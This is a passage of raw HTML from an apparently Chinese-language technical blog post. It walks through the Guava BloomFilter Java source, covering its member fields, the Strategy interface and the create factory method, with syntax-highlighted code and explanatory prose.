class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1a1999545802-6\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1a1999545802-7\"><span class=\"crayon-h\">  </span><span class=\"crayon-c\">/** The funnel to translate Ts to bytes */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1a1999545802-8\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1a1999545802-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1a1999545802-10\"><span class=\"crayon-h\">  </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1a1999545802-11\"><span class=\"crayon-c\">   * The strategy we employ to map an element T to {@ code numHashFunctions} bit indexes.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1a1999545802-12\"><span class=\"crayon-c\">   */</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1a1999545802-13\"><span class=\"crayon-h\">  </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">final</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Strategy </span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><!-- [Format Time: 0.0017 seconds] --></p>\n<p>这是它的4个成员变量</p>\n<ul>\n<li>BitArrays是定义在BloomFilterStrategies中的内部类，封装了布隆过滤器底层bit数组的操作，后文详述；</li>\n<li>numHashFunctions表示哈希函数的个数，即上文提到的k；</li>\n<li>Funnel，这是Guava中定义的一个接口，它和PrimitiveSink配套使用，主要是把任意类型的数据转化成Java基本数据类型（primitive value，如char，byte，int……），默认用java.nio.ByteBuffer实现，最终均转化为byte数组；</li>\n<li>Strategy是定义在BloomFilter类内部的接口，代码如下，有3个方法，put（插入元素），mightContain（判定元素是否存在）和ordinal方法（可以理解为枚举类中那个默认方法）</li>\n</ul>\n<p><!-- [Format Time: 0.0029 seconds] --></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1ab801346743\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ninterface Strategy extends java.io.Serializable {\r\n\r\n    /**\r\n     * Sets {@ code numHashFunctions} bits of the given bit array, by hashing a user element.\r\n     *\r\n     * &lt;p&gt;Returns whether any bits changed as a result of this operation.\r\n     */\r\n    &lt;T&gt; boolean put(T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits);\r\n\r\n    /**\r\n     * Queries {@ code numHashFunctions} bits of the given bit array, by hashing a user element;\r\n     * returns {@ code true} if and only if all selected bits are set.\r\n     */\r\n    &lt;T&gt; boolean mightContain(\r\n        T object, Funnel&lt;? super T&gt; funnel, int numHashFunctions, BitArray bits);\r\n\r\n    /**\r\n     * Identifier used to encode this strategy, when marshalled as part of a BloomFilter. Only\r\n     * values in the [-128, 127] range are valid for the compact serial form. Non-negative values\r\n     * are reserved for enums defined in BloomFilterStrategies; negative values are reserved for any\r\n     * custom, stateful strategy we may define (e.g. any kind of strategy that would depend on user\r\n     * input).\r\n     */\r\n    int ordinal();\r\n  }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1ab801346743-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-1\"><span class=\"crayon-t\">interface</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Strategy </span><span class=\"crayon-r\">extends</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">Serializable</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-4\"><span class=\"crayon-c\">     * Sets {@ code numHashFunctions} bits of the given bit array, by hashing a user element.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-5\"><span class=\"crayon-c\">     *</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-6\"><span class=\"crayon-c\">     * &lt;p&gt;Returns whether any bits changed as a result of this operation.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-7\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">put</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-11\"><span class=\"crayon-c\">     * Queries {@ code numHashFunctions} bits of the given bit array, by hashing a user element;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-12\"><span class=\"crayon-c\">     * returns {@ code true} if and only if all selected bits are set.</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-13\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">T</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">object</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray </span><span class=\"crayon-v\">bits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-18\"><span class=\"crayon-c\">     * Identifier used to encode this strategy, when marshalled as part of a BloomFilter. Only</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-19\"><span class=\"crayon-c\">     * values in the [-128, 127] range are valid for the compact serial form. Non-negative values</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-20\"><span class=\"crayon-c\">     * are reserved for enums defined in BloomFilterStrategies; negative values are reserved for any</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-21\"><span class=\"crayon-c\">     * custom, stateful strategy we may define (e.g. any kind of strategy that would depend on user</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-22\"><span class=\"crayon-c\">     * input).</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-23\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1ab801346743-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ordinal</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1ab801346743-25\"><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0024 seconds] -->\r\n<p>对于创建布隆过滤器，BloomFilter并没有公有的构造函数，只有一个私有构造函数，而对外它提供了5个重载的create方法，在缺省情况下误判率设定为3%，采用BloomFilterStrategies.MURMUR128_MITZ_64的实现。其中4个create方法最终都调用了同一个create方法，由它来负责调用私有构造函数，其源码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f39e8bb1af367419291\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">Java</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic &lt;T&gt; BloomFilter&lt;T&gt; create(\r\n      Funnel&lt;? super T&gt; funnel, long expectedInsertions, double fpp, Strategy strategy) {\r\n    checkNotNull(funnel);\r\n    checkArgument(\r\n        expectedInsertions &gt;= 0, \"Expected insertions (%s) must be &gt;= 0\", expectedInsertions);\r\n    checkArgument(fpp &gt; 0.0, \"False positive probability (%s) must be &gt; 0.0\", fpp);\r\n    checkArgument(fpp &lt; 1.0, \"False positive probability (%s) must be &lt; 1.0\", fpp);\r\n    checkNotNull(strategy);\r\n\r\n    if (expectedInsertions == 0) {\r\n      expectedInsertions = 1;\r\n    }\r\n    /*\r\n     * TODO(user): Put a warning in the javadoc about tiny fpp values, since the resulting size\r\n     * is proportional to -log(p), but there is not much of a point after all, e.g.\r\n     * optimalM(1000, 0.0000000000000001) = 76680 which is less than 10kb. Who cares!\r\n     */\r\n    long numBits = optimalNumOfBits(expectedInsertions, fpp);\r\n    int numHashFunctions = optimalNumOfHashFunctions(expectedInsertions, numBits);\r\n    try {\r\n      return new BloomFilter&lt;T&gt;(new BitArray(numBits), numHashFunctions, funnel, strategy);\r\n    } catch (IllegalArgumentException e) {\r\n      throw new IllegalArgumentException(\"Could not create BloomFilter of \" + numBits + \" bits\", e);\r\n    }\r\n  }</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f39e8bb1af367419291-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f39e8bb1af367419291-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-2\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">Funnel</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">super</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">T</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">double</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Strategy </span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkNotNull</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">funnel</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Expected insertions (%s) must be &gt;= 0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"False positive probability (%s) must be &gt; 0.0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkArgument</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">fpp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1.0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"False positive probability (%s) must be &lt; 1.0\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">checkNotNull</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">strategy</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-11\"><span class=\"crayon-h\">      </span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-14\"><span class=\"crayon-c\">     * TODO(user): Put a warning in the javadoc about tiny fpp values, since the resulting size</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-15\"><span class=\"crayon-c\">     * is proportional to -log(p), but there is not much of a point after all, e.g.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-16\"><span class=\"crayon-c\">     * optimalM(1000, 0.0000000000000001) = 76680 which is less than 10kb. Who cares!</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-17\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numBits</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfBits</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fpp</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numHashFunctions</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">optimalNumOfHashFunctions</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">expectedInsertions</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">numBits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f39e8bb1af367419291-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f39e8bb1af367419291-21\"><span class=\"crayon-h\">      </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-e \">&lt;T&gt;</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BitArray</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">numBits</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span 